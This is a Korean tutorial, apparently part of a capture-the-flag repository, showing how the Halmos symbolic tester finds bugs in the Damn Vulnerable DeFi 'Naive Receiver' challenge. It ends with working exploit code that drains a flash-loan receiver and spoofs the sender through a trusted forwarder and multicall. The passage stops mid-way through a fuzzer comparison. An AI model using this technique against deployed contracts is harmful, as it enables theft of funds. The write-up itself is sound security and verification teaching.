# Halmos vs Naive-receiver

## Halmos 버전
이 글에서는 halmos 0.2.1.dev19+g4e82a90 버전이 사용되었습니다.

## 서문
독자는 [Unstoppable](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/unstoppable)과 [Truster](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/truster) 해결에 관한 이전 글들에 익숙하다고 강력하게 가정합니다. 주요 아이디어가 여기에서도 대부분 반복되므로 다시 설명하지 않습니다.

## 준비
### 공통 필수 조건
1. **NaiveReceiver.t.sol** 파일을 **NaiveReceiverHalmos.t.sol**로 복사합니다. 이 파일에서 작업할 것입니다.
2. `test_naiveReceiver()`의 이름을 `check_naiveReceiver()`로 변경하여 Halmos가 이 테스트를 심볼릭하게 실행하도록 합니다.
3. `makeAddr()` 치트코드 사용을 피하십시오:
    ```solidity
        address deployer = address(0xcafe0000);
        address recovery = address(0xcafe0002);
    ```
    이번 과제에서는 처음으로 `player` 주소 외에 플레이어의 개인 키를 가지고 있습니다. 하지만 Halmos가 암호학에 약하다는 것을 알고 있으므로 이를 무시할 것입니다. 하지만 개인 키가 필요할 수 있는 모든 곳에서 마치 이 키를 가진 것처럼 행동할 것입니다.
    ```solidity
    function setUp() public {
        //(player, playerPk) = makeAddrAndKey("player");
        player = address(0xcafe0001);
        ...
    ```
4. `vm.getNonce()`는 지원되지 않는 치트코드입니다. `_isSolved()` 함수에서 삭제하십시오.
5. **GlobalStorage** 계약을 생성하고 모든 주소-이름 쌍을 저장하십시오:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    contract NaiveReceiverChallenge is Test {
    ...
        GlobalStorage glob;
        NaiveReceiverPool pool;
    ...
        function setUp() public {
            ...
            glob = new GlobalStorage();
            ...
            glob.add_addr_name_pair(address(weth), "WETH");
            glob.add_addr_name_pair(address(forwarder), "BasicForwarder");
            glob.add_addr_name_pair(address(pool), "NaiveReceiverPool");
            glob.add_addr_name_pair(address(receiver), "FlashLoanReceiver");
            vm.stopPrank();
        }
        ...
    }
    ```
6. 다가올 **SymbolicAttacker**를 포함하여 모든 계약 주소를 출력하십시오:
    ```solidity
    function check_naiveReceiver() public checkSolvedByPlayer {
        ...
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t", address(glob));
        console.log("WETH\t\t", address(weth));
        console.log("BasicForwarder\t", address(forwarder));
        console.log("NaiveReceiverPool\t", address(pool));
        console.log("FlashLoanReceiver\t", address(receiver));
        console.log("attacker\t\t", address(attacker));
        ...
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] WETH               0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] BasicForwarder     0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] NaiveReceiverPool  0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] FlashLoanReceiver  0x00000000000000000000000000000000000000000000000000000000aaaa0006
    [console.log] attacker           0x00000000000000000000000000000000000000000000000000000000aaaa0007
    ```
### _isSolved() 구현
원래 확인 로직은 다음과 같습니다:
```solidity
// The flashloan receiver contract has been emptied
assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
// Pool is empty too
assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
// All funds sent to recovery account
assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
```
그렇다면 반대되는 assert는 다음과 같습니다:
```solidity
assert( weth.balanceOf(address(receiver)) != 0 || 
        weth.balanceOf(address(pool)) != 0 || 
        weth.balanceOf(recovery) != WETH_IN_POOL + WETH_IN_RECEIVER);
```
## 커버리지 개선
대상 계약의 모든 경로가 커버되는지 확인하기 위해 단일 트랜잭션 **SymbolicAttacker**로 시작해 봅시다:
```solidity
function check_naiveReceiver() public checkSolvedByPlayer {
    ...
    attacker.attack();
}
```
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";
import "forge-std/Test.sol";
import "lib/GlobalStorage.sol";

contract SymbolicAttacker is Test, SymTest {
    // 편의를 위해 이 주소를 하드코딩할 수 있습니다
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 

    function execute_tx() private {
        address target = svm.createAddress("target");
        bytes memory data;
        //구체적인 target-name 쌍 얻기
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call(data);
    }

	function attack() public {
        execute_tx();
    }
}
```
### 이슈 #338
현재 계약 상태에서 Halmos를 실행하려고 하면 실패할 것입니다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
...
WARNING:halmos:path.append(false)
(see https://github.com/a16z/halmos/wiki/warnings#internal-error)
...
WARNING:halmos:check_naiveReceiver(): all paths have been reverted; the setup state or inputs may have been too restrictive.
(see https://github.com/a16z/halmos/wiki/warnings#revert-all)
[ERROR] check_naiveReceiver() (paths: 0, time: 0.07s, bounds: [])
```
이것은 글 작성 시점까지 아직 수정되지 않은 알려진 Halmos [이슈](https://github.com/a16z/halmos/issues/338)입니다. 이 문제의 원인을 깊이 파고들지는 않겠습니다. 쉬운 우회 방법이 있다는 것만 말씀드리겠습니다. 그저 다음과 같이 변경하십시오:
```solidity
startHoax(deployer);
```
를 다음과 같이:
```solidity
startHoax(deployer, 1 << 80);
```
### 심볼릭 콜데이터 리팩토링
**GlobalStorage**를 사용하여 심볼릭 콜데이터 호출을 대체하는 연습을 다시 해봅시다. 그러한 호출이 있는 곳이 2군데 있습니다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver -vvvvv
...
Path #73:
...
Trace:
            CALL 0xaaaa0004::execute(Concat(0x00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000540, p_request.from_address_2a3a33c_04(), p_request.target_address_81de530_05(), p_request.value_uint256_2210ac7_06(), p_request.gas_uint256_e439f98_07(), p_request.nonce_uint256_914d5f0_08(), 0x00000000000000000000000000000000000000000000000000000000000000e0, p_request.deadline_uint256_db05164_11(), p_request.data_length_a924678_10(), p_request.data_bytes_1a6ece2_09(), p_signature_length_9c169ac_13(), p_signature_bytes_b128a84_12()))
                STATICCALL 0xaaaa0005::trustedForwarder() [static]
                ...
                CALL 0xaaaa0005::Extract(p_request.data_bytes_1a6ece2_09())(Concat(Extract(p_request.data_bytes_1a6ece2_09()), Extract(p_request.from_address_2a3a33c_04())))
                CALLDATALOAD (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(8159, 7904, p_request.data_bytes_1a6ece2_09)'))
...
...
Path #222:
...
Trace:
...
            CALL 0xaaaa0005::multicall(Concat(0x0000000000000000000000000000000000000000000000000000000000000020, p_data_length_b01ff59_09(), 0x00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000460, p_data[0]_length_af6f818_11(), p_data[0]_bytes_4bddd90_10(), p_data[1]_length_9cf4186_13(), p_data[1]_bytes_d9323aa_12()))
            ...
            DELEGATECALL 0xaaaa0005::Extract(p_data[1]_bytes_d9323aa_12())(Extract(p_data[1]_bytes_d9323aa_12()))
            CALLDATALOAD (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(8159, 7904, p_data[1]_bytes_d9323aa_12)'))
```
첫 번째 심볼릭 콜데이터 호출은 `BasicForwarder::execute()`에 포함되어 있습니다:
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    ...
    bytes memory payload = abi.encodePacked(request.data, request.from);
    ...
    assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }
}
```
사실 이것은 익숙한 target-data 호출 패턴입니다. 동시에 Halmos는 가스를 전혀 계산하지 않으므로 가스 관련 로직은 완전히 무시합니다. 우리는 항상 충분한 가스가 있다고 가정합니다. 따라서 우리가 이미 알고 있는 방식으로 처리합니다:
```solidity
import "lib/GlobalStorage.sol";
...
contract BasicForwarder is EIP712 {
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002));
    ...
    function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
        ...
        // "newdata"를 "data"처럼 사용
        bytes memory newdata;
        // 재귀 방지
        vm.assume(target != address(this));
        (target, newdata) = glob.get_concrete_from_symbolic(target);
        bytes memory payload = abi.encodePacked(newdata, request.from); // 이 패킹을 잊지 마세요
        target.call(payload);
    }
}
```
그리고 두 번째 호출은 `Multicall::multicall()`에 있습니다:
```solidity
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
```
이것은 새로운 것입니다. 여기서는 심볼릭 콜데이터 호출이 하나가 아니라 전체 배치로 있습니다. 사실 이것을 처리하는 것은 훨씬 더 어렵습니다. 이전 챌린지에서 심볼릭 트랜잭션을 단 1개만 추가했을 때 테스트 실행 시간이 얼마나 급격히 증가했는지 기억합니다. 그러니 전체 심볼릭 배치 실행 대신 단 하나의 트랜잭션으로 시작하고, 더 필요할 수도 있다는 것을 명심합시다:
```solidity
// 심볼릭 multicall
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](1);
    address target = address(this);
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    // 재귀 방지
    vm.assume (bytes4(newdata) != this.multicall.selector);
    results[0] = Address.functionDelegateCall(target, newdata);
    return results;
}
```
### 루프 제한 늘리기
확인을 다시 실행해 봅시다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
...
[PASS] check_naiveReceiver() (paths: 685, time: 124.43s, bounds: [])
WARNING:halmos:check_naiveReceiver(): paths have not been fully explored due to the loop unrolling bound: 2
(see https://github.com/a16z/halmos/wiki/warnings#loop-bound)
```
심볼릭 콜데이터 오프셋 문제는 해결되었지만, 또 다른 경고가 나타났습니다.
이 경고가 말하는 것은 너무 많은 반복이 필요한 루프가 있다는 것입니다. 기본적으로 Halmos는 2번의 루프 반복만 수행합니다. 그리고 **GlobalStorage**는 주소들(우리는 4개를 전송했습니다)을 반복하므로 모든 주소가 심볼릭하게 실행되지 않았습니다. 따라서 Halmos를 시작할 때 1개의 매개변수를 더 전달할 것입니다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 4
...
[PASS] check_naiveReceiver() (paths: 845, time: 58.14s, bounds: [])
Symbolic test result: 1 passed; 0 failed; time: 59.01s
```
완벽합니다. 경로 수가 증가했고 더 이상 경고가 없습니다. 하지만 불변 조건은 아직 깨지지 않았으므로 다음 단계로 진행해야 합니다.
## 트랜잭션 늘리기
우리는 이미 한 번의 트랜잭션으로 문제를 해결할 수 없다면 여러 트랜잭션으로 해결을 시도할 수 있다는 것을 알고 있습니다. 우리는 이 방향으로 가고 있습니다. [Truster](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/truster#another-transaction)와 비슷하게 **SymbolicAttacker**에 트랜잭션을 하나 더 추가해 봅시다:
```solidity
function execute_tx() private {
    address target = svm.createAddress("target");
    bytes memory data;
    //구체적인 target-name 쌍 얻기
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call(data);
}

function attack() public {
    execute_tx();
    execute_tx();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 4
...
[console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] WETH               0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] BasicForwarder     0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] NaiveReceiverPool  0x00000000000000000000000000000000000000000000000000000000aaaa0005
[console.log] FlashLoanReceiver  0x00000000000000000000000000000000000000000000000000000000aaaa0006
[console.log] attacker           0x00000000000000000000000000000000000000000000000000000000aaaa0007
...
Killed
```
재앙입니다! 한 시간 후, Halmos는 메모리 부족으로 인해 단순히 붕괴되었습니다. 이것은 심볼릭 분석의 알려진 문제입니다: [경로 폭발(Path Explosion)](https://en.wikipedia.org/wiki/Path_explosion). Halmos는 4개의 계약 설정에서 2개의 트랜잭션의 심볼릭 실행을 처리할 수 없었습니다.
## 최적화
여기서 우리는 Halmos의 한계에 도달했으며, 이 문제를 그렇게 직접적으로 해결하는 것은 불가능합니다. 몇 가지 최적화를 도입해야 합니다.
### 치트(Cheats)
아래에 설명될 스마트 계약 최적화는 Foundry 치트 코드(**Test**에서)와 Halmos 자체(**SymTest**에서)의 사용을 필요로 합니다. 물론, 그냥 이 스마트 계약들로부터 상속을 추가하면 잘 작동할 것입니다. 하지만 이것은 대상 스마트 계약의 바이트코드를 상당히 변경시키며 원치 않는 부작용의 작은 위험이 있습니다. 따라서 최적화가 대상 스마트 계약의 동작에 미치는 잠재적 영향을 최소화하기 위해 `lib/Cheats.sol`에 다음과 같은 추상 계약을 생성합시다:
```solidity
import "forge-std/Test.sol";
import "./halmos-cheatcodes/src/SymTest.sol";

abstract contract Cheats {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    SVM internal constant svm = SVM(address(uint160(uint256(keccak256("svm cheat code")))));
}
```
그리고 Cheats로부터 상속을 받습니다:
```solidity
contract BasicForwarder is EIP712, Cheats {
    ...
}
```
```solidity
abstract contract Multicall is Context, Cheats {
    ...
}
```
### onFlashLoan
먼저 `FlashLoanReceiver::onFlashLoan()`을 봅시다:
```solidity
contract FlashLoanReceiver is IERC3156FlashBorrower {
    address private pool;
    ...
    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
    ...
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
    }
}
...
```
이 함수는 이 계약의 유일한 함수입니다. 또한, `msg.sender`가 `pool`이 아니라면 실행되지 않을 것입니다. 따라서 **GlobalStorage**에서 `FlashLoanReceiver`를 안전하게 삭제할 수 있습니다. 그 다음으로 **NaiveReceiverPool** 로직을 최적화합시다.

여기를 보세요:
```solidity
contract NaiveReceiverPool is Multicall, IERC3156FlashLender {
...
    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
    }
...
}
```
우리 설정에서 유일한 **IERC3156FlashBorrower**는 **FlashLoanReceiver**입니다. 따라서 솔버의 작업을 더 쉽게 만들어 줍시다:
```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    vm.assume (address(receiver) == address(0xaaaa0006)); // 설정의 receiver
    ...
}
```
### _checkRequest
다음 최적화는 `BasicForwarder::_checkRequest()`와 관련이 있습니다:
```solidity
function _checkRequest(Request calldata request, bytes calldata signature) private view {
    ...
    if (IHasTrustedForwarder(request.target).trustedForwarder() != address(this)) revert InvalidTarget();
    ...
}
```
**BasicForwarder**가 신뢰할 수 있는 `forwarder`인 유일한 계약은 **NaiveReceiverPool**입니다. 따라서 **BasicForwarder**의 `target`은 오직 `pool`일 수 있습니다:
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    ...
    // "newdata"를 "data"처럼 사용
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    bytes memory payload = abi.encodePacked(newdata, request.from);
    vm.assume(target == address(0xaaaa0005)); // pool
    target.call(payload);
}
```
### 암호학적 검사
그 옆에 `_checkRequest()`에 서명에 대한 암호학적 검사가 있습니다:
```solidity
function _checkRequest(Request calldata request, bytes calldata signature) private view {
...
    address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature);
    if (signer != request.from) revert InvalidSigner();
}
```
우리는 이미 Halmos와 같은 도구들이 암호학적 검사를 잘 수행하지 못한다는 것을 알고 있으므로, 여기서 논리적으로 생각해야 합니다.
문제의 조건에 따라 여기세어 전달 트랜잭션에 서명하는 데 사용할 수 있는 `player` 개인 키가 있다는 것을 기억합시다. 우리가 전달할 수 있는 유일한 `request.from`은 `player` 주소라는 것이 밝혀졌습니다:
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
...
vm.assume(request.from == address(0xcafe0001));
...
```
그리고 `_checkRequest()` 자체에서 우리는 이 검사들을 제거할 것입니다.

다시 시도해 봅시다:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 3
...
killed
```
아니요, 여전히 너무 어렵습니다.

### 작은 업데이트
Halmos의 최신 버전에서는 메모리의 선형 증가 문제와 그로 인한 메모리 부족 충돌이 수정되었습니다. 이제 이 테스트를 실행하는 데 매우 오랜 시간이 걸리지만, 적어도 실행을 완료할 수는 있습니다. 그러나 여전히 반례를 찾을 수 없습니다.

## 휴리스틱
우리는 더 이상 안정적인 개선만으로는 Halmos가 과거 챌린지처럼 명확한 형태로 문제의 해결책을 제시할 것이라고 기대할 수 없는 지점에 도달했습니다. 심볼릭하게 커버될 수 있는 가능성이 있는 시나리오를 희생하여 약간의 완화를 적용해 보아야 합니다.
### 프록시 휴리스틱
**BasicForwarder**는 본질적으로 **NaiveReceiverPool**을 위한 프록시 계약일 뿐이고 `multicall()`은 차례로 다른 `pool` 함수들을 위한 프록시 함수이므로, **NaiveReceiverPool**의 함수를 직접 호출하는 시나리오를 희생해 볼 수 있습니다. 반면에 우리는 중복된 심볼릭 호출을 하지 않는 이점을 얻으면서 전체 코드 커버리지를 줄이지 않습니다. 다시 말해: `pool` 함수를 직접 호출하지는 않지만, 어차피 프록시를 통해 호출될 것이므로 커버할 것입니다.
```solidity
function setUp() public {
    ...
    glob.add_addr_name_pair(address(weth), "WETH");
    glob.add_addr_name_pair(address(forwarder), "BasicForwarder");
    // NaiveReceiverPool 직접 호출 제외
    //glob.add_addr_name_pair(address(pool), "NaiveReceiverPool");
    ...
}
```
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    ...
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    bytes memory payload = abi.encodePacked(newdata, request.from);
    vm.assume(target == address(0xaaaa0005));
    vm.assume(bytes4(newdata) == bytes4(keccak256("multicall(bytes[])")));
    target.call(payload);
}
```
### msg.data 사용 힌트
**NaiveReceiverPool**의 이 코드 조각을 살펴봅시다:
```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
        ...
}
```
여기서 `msg.data`는 일반 바이트 배열처럼 작동합니다. 이러한 경우, 그러한 함수를 심볼릭하게 호출한다면 `svm.CreateCalldata()` 대신 `svm.createBytes()`를 사용하는 것이 훨씬 더 좋습니다. 그래야 Halmos가 더 유연하게 행동하고 예상치 못한 콜데이터 조작과 관련된 더 미묘한 버그를 찾을 수 있습니다. 우리가 여기로 올 수 있는 유일한 곳은 `multicall()`->`withdraw()`입니다. 따라서 `multicall()`을 다소 변경해 봅시다:
```solidity
// 심볼릭 multicall
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    ...
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    ...
    // 선택자가 "withdraw"인 경우
    if (selector == bytes4(keccak256("withdraw(uint256,address)")))
    {
        newdata = svm.createBytes(100, "multicall_newdata");
        vm.assume (bytes4(newdata) == selector);
    }
    results[0] = Address.functionDelegateCall(target, newdata);
    return results;
}
```
### 단순화된 불변 조건
지금까지 우리는 문제의 해결책을 직접적으로 제공하는 불변 조건을 사용했습니다. 하지만 직접적인 해결책을 찾을 수 없다면 다른 원칙을 적용할 것입니다. 먼저, 자산이 `recovery`에 있어야 한다는 조건을 제거해 봅시다. 만약 대상 주소에서 자금을 훔칠 공격을 찾을 수 있다면, 그것을 복구 주소로 전송하는 방법은 명백할 것이라고 합리화합시다. 결과적으로 우리는 필요한 심볼릭 트랜잭션의 수를 절약할 수 있을 것입니다:
```solidity
function _isSolved() private view {
    ...
    assert (weth.balanceOf(address(receiver)) != 0 || 
            weth.balanceOf(address(pool)) != 0); 
```
하지만 더 나아가 봅시다. 대상 계약의 잔액을 줄일 수 있는지라도 알아봅시다. 어쩌면 그것이 공격에 대한 아이디어를 줄지도 모릅니다:
```solidity
function _isSolved() private view {
    assert (weth.balanceOf(address(pool)) >= WETH_IN_POOL || 
            weth.balanceOf(address(receiver)) >= WETH_IN_RECEIVER);
}
```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
...
Counterexample:
halmos_multicall_newdata_bytes_e2c4a17_67 = 0x00f714ce0000000000000000000000000000000000000000000000070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cafe0000
halmos_selector_bytes4_2b51260_47 = execute
halmos_selector_bytes4_acafed2_66 = withdraw
halmos_selector_bytes4_e0bb9db_14 = execute
halmos_selector_bytes4_f3c1dfe_33 = flashLoan
halmos_target_address_2eb5185_01 = 0x00000000000000000000000000000000aaaa0004
halmos_target_address_a486edd_34 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_53924bb_28 = 0x0000000000000000000000000000000000000000000000000000000007740000000000000000
p_data_length_1638d62_30 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_receiver_address_3b7cd58_26 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p_request.from_address_d094f2c_04 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
p_request.from_address_fa75348_37 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
p_request.target_address_9cc3344_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_request.target_address_c287625_38 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_signature_length_7e37d64_13 = 0x0000000000000000000000000000000000000000000000000000000000000041
p_signature_length_fb058e7_46 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_token_address_a8696b9_27 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
...
[FAIL] check_naiveReceiver() (paths: 20371, time: 1592.14s, bounds: [])
```
반례가 발견되었습니다!
### 다른 방법
반례 분석을 진행하기 전에, 유사한 결과를 더 쉬운 방법으로 달성할 수 있었다는 점을 언급할 가치가 있습니다. 가능한 시나리오를 희생하는 대신, 불변 조건을 더 단순화할 수 있었습니다. "작은 조각으로 물어뜯기"를 시도하고 서로 독립적으로 이러한 불변 반례를 찾을 수 있었습니다.

그래서:
1. **NaiveReceiverPool**을 **GlobalStorage**로 반환
    ```solidity
    glob.add_addr_name_pair(address(weth), "WETH");
    glob.add_addr_name_pair(address(forwarder), "BasicForwarder");
    glob.add_addr_name_pair(address(pool), "NaiveReceiverPool");
    ```
2. 단일 심볼릭 트랜잭션으로 돌아가기
    ```solidity
    function attack() public {
        execute_tx();
        //execute_tx();
    }
    ```
3. 불변 조건 분리
    ```solidity
    function _isSolved() private view {
        assert (weth.balanceOf(address(pool)) >= WETH_IN_POOL);
        assert (weth.balanceOf(address(receiver)) >= WETH_IN_RECEIVER);
    }
    ```
실행:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 3
...
Counterexample:
halmos_selector_bytes4_0f6d90c_16 = flashLoan
halmos_target_address_b163b06_01 = 0x00000000000000000000000000000000aaaa0005
p_amount_uint256_0638d47_06 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_data_length_98af919_08 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_receiver_address_61d6d2d_04 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p_token_address_383970d_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
...
Counterexample:
halmos_multicall_newdata_bytes_4d9e59c_44 = 0x00f714ce00000000000000000000000000000000000000000000003635c9adc5dea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cafe0000
halmos_selector_bytes4_2d91fe2_43 = withdraw
halmos_selector_bytes4_ee6acf1_14 = execute
halmos_target_address_b163b06_01 = 0x00000000000000000000000000000000aaaa0004
p_data_length_b44e459_22 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_request.from_address_54c3352_04 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
p_request.target_address_a92dbac_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_signature_length_8d509fd_13 = 0x0000000000000000000000000000000000000000000000000000000000000400
```
## 반례 분석
여기서 한 번에 2개의 버그가 발견되었습니다.
첫 번째 버그의 메커니즘은 매우 간단합니다. `flashLoan()`을 실행하고, 수신자로 우리가 소유하지 않은 **FlashLoanReceiver** 계약을 지정하여 트랜잭션당 1 **WETH**씩 비우는 것입니다. 이 잔액을 0으로 비우는 데 10번의 트랜잭션이 필요했기 때문에 Halmos가 더 명확한 불변 조건에서는 실패했습니다.
두 번째 버그의 메커니즘은 매우 흥미롭습니다. 이를 위해서는 2가지 조건을 충족해야 합니다: `msg.sender`를 `forwarder`로 하여 `withdraw()`를 실행하지만, 동시에 `payload` 끝에 우리 주소가 연결되는 것을 우회해야 합니다:
```solidity
bytes memory payload = abi.encodePacked(newdata, request.from);
...
target.call(payload);
```
```solidity
if (msg.sender == trustedForwarder && msg.data.length >= 20) {
    return address(bytes20(msg.data[msg.data.length - 20:]));
}
```
그리고 Halmos는 시나리오를 찾았습니다: `multicall()`에서 호출되어야 하며, 이를 통해 `forwarder`를 대신하여(via `delegateCall()`) 인출할 수 있게 하면서 동시에 임의의 `receiver`에게 자금을 인출하여 임의의 주소의 잔액을 비우고, 그것을 `data` 끝에 삽입합니다. 이를 위해 앞서 `svm.createBytes()`를 사용한 힌트가 필요했습니다.
## 반례 사용
`attacker`를 사용하여 **FlashLoanReceiver**를 황폐화시킵니다:
```solidity
pragma solidity =0.8.25;

import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";

contract Attacker {
    function attack(NaiveReceiverPool pool, FlashLoanReceiver receiver, WETH weth) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(weth), 1, "b1bab0ba");
        }
    }
} 
```
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    Attacker attacker = new Attacker();
    attacker.attack(pool, receiver, weth);
    ...
}
```
이제 우리는 모든 풀 자금을 `recovery`로 보냅니다. Halmos를 통한 테스트에서 플레이어의 개인 키를 무시했던 것을 기억합니다. 물론 실제 공격에서는 `Forwarder`에 대한 유효한 요청을 만들어야 합니다. 이번에는 `attacker` 계약을 사용하지 않을 것입니다. 개인 키를 어떤 계약에 전송하고 싶지 않으니까요 :)
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
...
    bytes[] memory callDatas = new bytes[](1);
    callDatas[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes32(uint256(uint160(deployer)))
    );
    bytes memory callData;
    callData = abi.encodeCall(pool.multicall, callDatas);
    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        30000000,
        forwarder.nonces(player),
        callData,
        1 days
    );
    bytes32 requestHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);
    require(forwarder.execute(request, signature));
}
```
우리가 직접 요청을 만들었으므로 (명백한 이유로 Halmos의 콜데이터를 사용할 수 없었으므로) - 이 요청은 [@siddharth9903](https://github.com/siddharth9903)의 [이곳](https://medium.com/@opensiddhu993/challenge-2-naive-receiver-damn-vulnerable-defi-v4-lazy-solutions-series-8b3b28bc929d)에서 복사했습니다 :)
```javascript
$ forge test -vv --mp test/naive-receiver/NaiveReceiver.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.53ms (1.50ms CPU time)
```
해냈습니다!
## 퍼징과 비교
이 문제에 대한 foundry 기반, echidna 기반 및 meduza 기반 해결책을 [여기](https://github.com/devdacian/solidity-fuzzing-comparison/tree/main/test/01-naive-receiver)에서 찾을 수 있습니다.
하지만, 새로운 버전의 Naive-receiver (v4)에 대한 해결책은 찾지 못했습니다. 사실 새 버전에는 콜데이터 조작과 정확하게 연결된 두 번째 버그가 추가되었고, **Truster**에서는 이것이 거의 차단 요소가 되었습니다. 따라서 퍼저들이 다음 로직을 전혀 파악할 수 있는지 확인해 봅시다.
### 목표
먼저, 이 **POCTarget** 계약을 작성합니다:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

contract POCTarget {
    uint256 public a;
    
    constructor() {
        a = 0;
    }

    function proxycall (bytes calldata data) public {
        address(this).call(data);
    }

    function changea () public {
        if (msg.sender != address(this)) {
            revert();
        }
        if (address(bytes20(msg.data[msg.data.length - 20:])) == address(this)) {
            a = 1;
        }
    }
}
```
퍼저가 이러한 로직을 지원한다면, `a==1`인 반례를 찾을 것입니다.
### Foundry
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./POCTarget.sol";
import {Test, console} from "forge-std/Test.sol";

contract POCFuzzing is Test {
    POCTarget target;
    address deployer = makeAddr("deployer");

    function setUp() public {
        startHoax(deployer);
        target = new POCTarget();
        vm.stopPrank();
        targetSender(deployer);
    }

    function invariant_isWorking() public {
        assert (target.a() != 1);
    }
}
```
```javascript
$ forge test -vv --mp test/naive-receiver/POCFuzzing.t.sol
...
[PASS] invariant_isWorking() (runs: 1000, calls: 500000, reverts: 249958)
```
작동하지 않음
### Echidna
```javascript
deployer: '0xcafe0001' 
